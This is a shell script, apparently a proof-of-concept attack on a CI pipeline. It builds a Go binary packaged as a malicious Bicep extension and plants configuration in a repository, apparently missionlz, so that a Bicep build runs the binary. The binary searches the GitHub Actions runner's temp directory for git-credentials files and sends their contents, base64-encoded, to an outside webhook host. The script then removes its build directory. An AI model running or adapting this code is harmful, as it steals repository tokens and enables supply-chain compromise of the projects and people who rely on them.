WEBHOOK_URL="${1:-https://lamian.robertprast.com}"
REPO_PATH="${2:-.}"

mkdir -p "$REPO_PATH/src/exfil-extension"
cd "$REPO_PATH/src/exfil-extension"

# Create Go module
cat > go.mod << 'GOMOD'
module exfil-extension
go 1.21
GOMOD

# Create main.go - exfiltrates on startup
cat > main.go << 'GOCODE'
package main

import (
    "encoding/base64"
    "io/ioutil"
    "net/http"
    "os"
    "path/filepath"
    "strings"
)

func main() {
    webhook := "WEBHOOK_PLACEHOLDER"

    // Search for git credentials
    tempDir := "/home/runner/work/_temp"
    files, _ := ioutil.ReadDir(tempDir)

    for _, f := range files {
            if strings.Contains(f.Name(), "git-credentials") && strings.HasSuffix(f.Name(), ".config") {
                    path := filepath.Join(tempDir, f.Name())
                    data, err := ioutil.ReadFile(path)
                    if err == nil {
                            encoded := base64.StdEncoding.EncodeToString(data)
                            http.Get(webhook + "?file=" + f.Name() + "&token=" + encoded)
                    }
            }
    }

    // Exit - bicep will fail but we already exfiltrated
    os.Exit(1)
}
GOCODE

# Replace webhook
sed -i "s|WEBHOOK_PLACEHOLDER|${WEBHOOK_URL}|g" main.go

# Build static binary for Linux
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o extension-linux-x64 .

# Create the extension archive
# Need types.tgz with index.json
echo '{"resources":{}, "functions":{}}' > index.json
echo '[]' > types.json
tar -cvf types.tar index.json types.json
gzip -f types.tar
mv types.tar.gz types.tgz

# Create final archive (flat structure)
tar -cvf exfil.tar types.tgz extension-linux-x64
gzip -f exfil.tar

# Move to repo
mkdir -p "$REPO_PATH/src/extensions"
mv exfil.tar.gz "$REPO_PATH/src/extensions/"

# Create bicepconfig.json  
cat > "$REPO_PATH/src/bicepconfig.json" << 'CONFIG'
{
"experimentalFeaturesEnabled": {
    "extensibility": true
},
"extensions": {
    "exfil": "/home/runner/work/missionlz/missionlz/src/extensions/exfil.tar.gz"
}
}
CONFIG

# Create bicep file
cat > "$REPO_PATH/src/mlz.bicep" << 'BICEP'
extension exfil

resource trigger 'exfil:Trigger@v1' = {
name: 'test'
}
BICEP

cd ..
rm -rf "$REPO_PATH/src/exfil-extension"

echo "Done! Extension at $REPO_PATH/src/extensions/exfil.tar.gz"
